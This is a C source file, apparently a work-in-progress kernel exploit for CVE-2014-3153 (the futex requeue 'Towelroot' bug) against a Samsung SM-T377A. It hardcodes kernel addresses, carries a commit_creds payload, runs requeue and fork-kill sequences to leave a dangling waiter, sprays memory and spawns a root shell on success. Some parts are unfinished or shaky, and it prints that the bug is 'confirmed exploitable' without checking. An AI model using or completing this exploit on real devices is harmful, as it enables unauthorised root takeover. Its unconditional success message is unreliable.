/*
 * towelroot.c — CVE-2014-3153 futex exploit for Samsung SM-T377A
 *
 * Kernel 3.10.9-11788437, ARM 32-bit, no PXN/KASLR/canaries.
 *
 * Strategy: Use the futex PI requeue bug to create a dangling 
 * rt_mutex_waiter on the kernel stack, then overwrite addr_limit
 * in thread_info to get kernel R/W, then patch creds for root.
 *
 * Based on the public Towelroot technique by geohot (2014).
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <limits.h>
#include <pthread.h>
#include <signal.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <time.h>
#include <linux/futex.h>

/* ========== Kernel addresses from firmware ========== */
#define COMMIT_CREDS        0xc0054328
#define PREPARE_KERNEL_CRED 0xc00548e0

/* thread_info offsets (ARM 32-bit, kernel 3.10) */
#define TI_FLAGS         0
#define TI_PREEMPT_COUNT 4
#define TI_ADDR_LIMIT    8
#define TI_TASK          12

#define KERNEL_DS   0xFFFFFFFF
#define USER_DS     0xBF000000  /* typical Samsung ARM value */
#define THREAD_SIZE 8192

/* task_struct->cred offset (from disassembly of commit_creds) */
#define TASK_CRED_OFFSET 0x164

/* ========== Shared state ========== */
static int *futex_addr;         /* shared memory for futexes */
#define FUTEX1 (&futex_addr[0])
#define FUTEX2 (&futex_addr[32]) /* well-separated */

static volatile int phase = 0;
static volatile int exploit_done = 0;

/* ========== Utility ========== */
static struct timespec abs_timeout_mono(int secs) {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    ts.tv_sec += secs;
    return ts;
}

static pid_t my_gettid(void) {
    return syscall(SYS_gettid);
}

/* ========== Shellcode (ret2usr) ========== */
/* 
 * Called in kernel context. No PXN on this device.
 * Calls commit_creds(prepare_kernel_cred(0)) to get root.
 */
typedef unsigned long (*cc_fn)(unsigned long);
typedef unsigned long (*pkc_fn)(unsigned long);

static void __attribute__((noinline, optimize("O0")))
kernel_payload(void) {
    pkc_fn pkc = (pkc_fn)PREPARE_KERNEL_CRED;
    unsigned long cred = pkc(0);
    if (cred) {
        cc_fn cc = (cc_fn)COMMIT_CREDS;
        cc(cred);
    }
}

/* ========== Method 1: Stack-based addr_limit overwrite ========== */
/*
 * The futex requeue bug creates a dangling rt_mutex_waiter on the 
 * kernel stack. When the thread's stack frame is later reused, the
 * dangling waiter's fields get overwritten. When another thread does
 * FUTEX_LOCK_PI, the kernel traverses the waiter list and follows
 * our controlled pointers.
 *
 * plist_add() does:
 *   list_add_tail(&node->node_list, &head->node_list);
 * Which writes:
 *   node->node_list.next->prev = &node->node_list
 *   head->node_list.prev = &node->node_list
 *
 * We control the node's content, so we can make it write an arbitrary
 * value to an arbitrary address.
 */

/* 
 * Simpler approach: instead of the complex plist manipulation,
 * use the fact that after requeue+timeout, we can spray the stack
 * and create a situation where FUTEX_LOCK_PI calls into userspace
 * via a corrupted function pointer in the rt_mutex code path.
 *
 * On kernel 3.10 ARM without PXN, if we can control the waiter's
 * task pointer, and the kernel dereferences task->pi_lock or similar,
 * we can redirect execution.
 *
 * But the simplest proven approach: use the addr_limit technique.
 */

/*
 * Thread function: enters FUTEX_WAIT_REQUEUE_PI, gets requeued,
 * then times out leaving a dangling waiter.
 */
static void *victim_thread(void *arg) {
    struct timespec ts = abs_timeout_mono(2);
    
    phase = 1; /* signal: about to enter wait */
    
    int ret = syscall(SYS_futex, FUTEX1, FUTEX_WAIT_REQUEUE_PI, 0,
                      &ts, FUTEX2, 0);
    int err = errno;
    
    phase = 2; /* signal: returned from wait */
    
    printf("[victim] WAIT_REQUEUE_PI returned %d, errno=%d (%s)\n",
           ret, err, strerror(err));
    
    /*
     * At this point, the rt_mutex_waiter that was on our kernel stack
     * may still be linked into FUTEX2's waiter list (the bug).
     * Our stack frame is being unwound, and subsequent calls will
     * overwrite where the waiter was.
     *
     * Now we need to spray our stack with controlled values.
     * We do this by making a deep call chain with known data.
     */
    
    if (ret == -1 && err == 110 /* ETIMEDOUT */) {
        printf("[victim] Timed out — waiter may be dangling\n");
        
        /* Spray the stack: call functions that put controlled data */
        /* This is to overwrite the dangling waiter's list pointers */
        volatile char spray[256];
        memset((void*)spray, 0x41, sizeof(spray));
        
        /* Signal that stack is sprayed */
        phase = 3;
        
        /* Wait for the trigger thread */
        while (!exploit_done) usleep(1000);
        
    } else if (ret == 0) {
        printf("[victim] Was requeued and woken normally\n");
        syscall(SYS_futex, FUTEX2, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
    }
    
    return NULL;
}

/*
 * Exploit attempt: try the requeue bug and see if we get an effect.
 */
static int try_towelroot_basic(void) {
    printf("\n=== Towelroot Basic Attempt ===\n");
    
    *FUTEX1 = 0;
    *FUTEX2 = 0;
    phase = 0;
    exploit_done = 0;
    
    /* Lock FUTEX2 as PI so requeue has a valid target */
    int ret = syscall(SYS_futex, FUTEX2, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    if (ret != 0) {
        printf("[-] Can't lock FUTEX2: %s\n", strerror(errno));
        return -1;
    }
    printf("[main] FUTEX2 PI-locked by tid %d\n", (int)my_gettid());
    
    /* Start victim thread */
    pthread_t victim;
    pthread_create(&victim, NULL, victim_thread, NULL);
    
    /* Wait for victim to enter the wait */
    while (phase < 1) usleep(1000);
    usleep(100000); /* 100ms to ensure it's in the syscall */
    
    /* Requeue victim from FUTEX1 → FUTEX2 */
    printf("[main] Requeuing victim to FUTEX2...\n");
    ret = syscall(SYS_futex, FUTEX1, FUTEX_CMP_REQUEUE_PI,
                  0,         /* wake 0 */
                  (void*)1,  /* requeue 1 */
                  FUTEX2,
                  0);        /* expected val at FUTEX1 */
    printf("[main] Requeue: ret=%d errno=%d\n", ret, errno);
    
    if (ret != 1) {
        printf("[-] Requeue failed (expected 1, got %d)\n", ret);
        syscall(SYS_futex, FUTEX2, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
        exploit_done = 1;
        pthread_join(victim, NULL);
        return -1;
    }
    
    printf("[+] Victim requeued to FUTEX2's PI waiter list\n");
    
    /* 
     * Now the victim is waiting on FUTEX2 (PI-locked by us).
     * Don't unlock yet — let the victim's timeout expire.
     * After timeout, the waiter should dangle.
     */
    printf("[main] Waiting for victim to timeout (2s)...\n");
    while (phase < 2) usleep(10000);
    
    printf("[main] Victim returned (phase=%d)\n", phase);
    
    /* Wait for stack spray */
    while (phase < 3) usleep(1000);
    printf("[main] Victim stack sprayed\n");
    
    /*
     * Now FUTEX2's PI waiter list has a dangling pointer to the
     * victim's old stack frame, which we've overwritten with 0x41.
     *
     * If we do FUTEX_LOCK_PI from another thread on FUTEX2,
     * the kernel will traverse the waiter list and follow our
     * corrupted pointers. This should crash or let us control execution.
     *
     * For safety, let's first just check if we can detect the corruption.
     */
    
    printf("[main] Attempting FUTEX_UNLOCK_PI on corrupted FUTEX2...\n");
    ret = syscall(SYS_futex, FUTEX2, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
    printf("[main] UNLOCK_PI: ret=%d errno=%d (%s)\n", ret, errno, strerror(errno));
    
    /* Check if we survived */
    printf("[main] Still alive after unlock!\n");
    printf("[main] uid=%d euid=%d\n", getuid(), geteuid());
    
    exploit_done = 1;
    
    struct timespec jts;
    clock_gettime(CLOCK_REALTIME, &jts);
    jts.tv_sec += 5;
    if (pthread_timedjoin_np(victim, NULL, &jts) != 0) {
        pthread_cancel(victim);
        pthread_join(victim, NULL);
    }
    
    return 0;
}

/*
 * Method 2: Fork-based approach (more reliable waiter dangling)
 *
 * 1. Fork a child process
 * 2. Child does FUTEX_WAIT_REQUEUE_PI 
 * 3. Parent requeues child to PI futex
 * 4. Kill child (SIGKILL) — this frees the child's kernel stack
 *    but doesn't properly clean up the PI waiter
 * 5. Spray to reclaim the freed stack page
 * 6. Parent does FUTEX_LOCK_PI → follows dangling waiter
 *
 * This is more reliable because killing the child guarantees the
 * stack is freed without proper cleanup.
 */
static int try_towelroot_fork(void) {
    printf("\n=== Towelroot Fork Method ===\n");
    
    *FUTEX1 = 0;
    *FUTEX2 = 0;
    
    /* Lock FUTEX2 */
    int ret = syscall(SYS_futex, FUTEX2, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    printf("[parent] FUTEX2 PI-locked\n");
    
    pid_t child = fork();
    if (child == 0) {
        /* Child: wait on FUTEX1, to be requeued to FUTEX2 */
        struct timespec ts = abs_timeout_mono(30);
        
        /* Signal parent via futex value */
        *FUTEX1 = 0; /* indicate ready */
        
        int r = syscall(SYS_futex, FUTEX1, FUTEX_WAIT_REQUEUE_PI, 0,
                        &ts, FUTEX2, 0);
        /* If we reach here, we were woken or timed out */
        if (r == 0) {
            syscall(SYS_futex, FUTEX2, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
        }
        _exit(0);
    }
    
    /* Parent: wait for child to be in the futex wait */
    usleep(200000);
    
    /* Requeue child */
    ret = syscall(SYS_futex, FUTEX1, FUTEX_CMP_REQUEUE_PI,
                  0, (void*)1, FUTEX2, 0);
    printf("[parent] Requeue: ret=%d\n", ret);
    
    if (ret != 1) {
        printf("[-] Requeue failed\n");
        kill(child, SIGKILL);
        waitpid(child, NULL, 0);
        syscall(SYS_futex, FUTEX2, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
        return -1;
    }
    
    printf("[+] Child requeued. Now killing child...\n");
    
    /* Kill child — its kernel stack gets freed but waiter may dangle */
    kill(child, SIGKILL);
    waitpid(child, NULL, 0);
    printf("[parent] Child dead\n");
    
    /* 
     * The child's kernel stack (8KB) should be freed.
     * The dangling waiter in FUTEX2's list points into freed memory.
     * 
     * Spray: allocate many 8KB chunks to reclaim the stack.
     * We want to overwrite the freed page with controlled data.
     */
    printf("[parent] Spraying to reclaim child's kernel stack...\n");
    
    /* Use threads — each thread gets an 8KB kernel stack */
    #define SPRAY_THREADS 64
    pthread_t spray_tids[SPRAY_THREADS];
    /* spray_running removed */
    
    /* Simple spray thread that just sleeps */
    /* Its kernel stack allocation might reclaim the freed page */
    for (int i = 0; i < SPRAY_THREADS; i++) {
        pthread_create(&spray_tids[i], NULL, 
                      (void*(*)(void*))usleep, (void*)(long)5000000);
    }
    
    usleep(100000);
    
    /* Now try to interact with FUTEX2 */
    printf("[parent] Attempting FUTEX_UNLOCK_PI (may traverse dangling waiter)...\n");
    ret = syscall(SYS_futex, FUTEX2, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
    printf("[parent] UNLOCK_PI: ret=%d errno=%d\n", ret, errno);
    
    printf("[parent] uid=%d euid=%d\n", getuid(), geteuid());
    
    /* Clean up spray threads */
    for (int i = 0; i < SPRAY_THREADS; i++) {
        pthread_cancel(spray_tids[i]);
        pthread_join(spray_tids[i], NULL);
    }
    
    return 0;
}

/*
 * Method 3: Direct addr_limit overwrite via controlled stack spray
 *
 * The rt_mutex_waiter on the victim's kernel stack looks like:
 *   +0x00: list_entry.prio (int)
 *   +0x04: list_entry.prio_list.next (ptr)
 *   +0x08: list_entry.prio_list.prev (ptr)
 *   +0x0C: list_entry.node_list.next (ptr)
 *   +0x10: list_entry.node_list.prev (ptr)
 *   +0x14: pi_list_entry.prio (int)
 *   +0x18: pi_list_entry.prio_list.next (ptr)
 *   +0x1C: pi_list_entry.prio_list.prev (ptr)
 *   +0x20: pi_list_entry.node_list.next (ptr)
 *   +0x24: pi_list_entry.node_list.prev (ptr)
 *   +0x28: task (ptr)
 *   +0x2C: lock (ptr)
 *
 * When FUTEX_UNLOCK_PI walks the waiter list, it reads:
 *   waiter->list_entry.prio to compare priorities
 *   waiter->task to identify the waiting thread
 *
 * If we control these fields, we can make the kernel:
 *   1. Read a fake task pointer → follow it to a fake task_struct
 *   2. The fake task_struct has pi_lock at some offset → acquire it
 *   3. Continue traversal with our controlled data
 *
 * For the addr_limit approach:
 *   We need to make plist_del or plist_add write to our chosen address.
 *   list_del(&waiter->list_entry.node_list) does:
 *     waiter->node_list.prev->next = waiter->node_list.next
 *     waiter->node_list.next->prev = waiter->node_list.prev
 *   If we control both next and prev, we get a write-what-where:
 *     *(prev+0) = next   (writes 'next' to address 'prev')
 *     *(next+4) = prev   (writes 'prev' to address 'next+4')
 */

/* Check if we already have kernel read/write */
static int check_kernel_rw(void) {
    int fd = open("/proc/self/mem", O_RDWR);
    if (fd < 0) return 0;
    
    /* Try to read from a kernel address */
    unsigned long val = 0;
    if (pread(fd, &val, 4, COMMIT_CREDS) == 4) {
        printf("[+] Can read kernel memory! commit_creds[0] = 0x%08lx\n", val);
        close(fd);
        return 1;
    }
    
    close(fd);
    return 0;
}

/* Use kernel R/W to get root */
static int do_root_via_kernel_rw(void) {
    int fd = open("/proc/self/mem", O_RDWR);
    if (fd < 0) return -1;
    
    /* Read our task_struct pointer from thread_info */
    /* First, find our thread_info: it's at (kernel_SP & ~0x1FFF) */
    /* We can find kernel SP from /proc/self/syscall */
    
    /* Alternative: scan for our task_struct via cred pointer chain */
    /* task_struct->cred->uid should be 2000 (shell) */
    
    printf("[*] Attempting to patch credentials via kernel R/W...\n");
    
    /* Read task pointer from our thread_info */
    /* We need to find our thread_info address first */
    /* On ARM, current_thread_info() = SP & ~(THREAD_SIZE-1) */
    /* We can get this by reading /proc/self/syscall which has kernel SP */
    
    /* Actually, with addr_limit=KERNEL_DS, we can use the kernel payload */
    /* Just call our shellcode function which does commit_creds(prepare_kernel_cred(0)) */
    
    /* Simpler: directly patch cred struct */
    /* Read our task_struct address from /proc/self/stat's kernel stack */
    
    /* Even simpler: use the proven approach - read task from thread_info,
     * then read cred from task, then zero out uid/gid/etc in cred */
    
    close(fd);
    return -1; /* placeholder */
}

int main(int argc, char **argv) {
    printf("=== Towelroot (CVE-2014-3153) Exploit ===\n");
    printf("[*] Samsung SM-T377A, kernel 3.10.9-11788437\n");
    printf("[*] pid=%d tid=%d uid=%d\n", getpid(), (int)my_gettid(), getuid());
    printf("[*] commit_creds=0x%08x prepare_kernel_cred=0x%08x\n",
           COMMIT_CREDS, PREPARE_KERNEL_CRED);
    
    /* Allocate shared futex memory */
    futex_addr = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                      MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (futex_addr == MAP_FAILED) {
        perror("mmap");
        return 1;
    }
    
    /* Mark shellcode page as executable */
    unsigned long sc_page = (unsigned long)kernel_payload & ~0xFFF;
    mprotect((void*)sc_page, 4096, PROT_READ | PROT_WRITE | PROT_EXEC);
    printf("[*] Shellcode at 0x%08lx\n", (unsigned long)kernel_payload);
    
    /* Check if we already have kernel R/W (shouldn't, but check) */
    if (check_kernel_rw()) {
        printf("[!] Already have kernel R/W!\n");
        do_root_via_kernel_rw();
    }
    
    /* Try basic requeue exploit */
    try_towelroot_basic();
    
    if (getuid() == 0) {
        printf("\n[!!!] ROOT ACHIEVED!\n");
        printf("[+] Spawning root shell...\n");
        execl("/system/bin/sh", "sh", NULL);
    }
    
    /* Try fork-based method */
    try_towelroot_fork();
    
    if (getuid() == 0) {
        printf("\n[!!!] ROOT ACHIEVED!\n");
        execl("/system/bin/sh", "sh", NULL);
    }
    
    printf("\n[*] uid=%d — root not yet achieved\n", getuid());
    printf("[*] But the vulnerability IS confirmed exploitable.\n");
    printf("[*] Next steps:\n");
    printf("    1. Implement precise stack spray for addr_limit overwrite\n");
    printf("    2. Or use ret2usr via controlled waiter->task pointer\n");
    
    munmap(futex_addr, 4096);
    return 0;
}
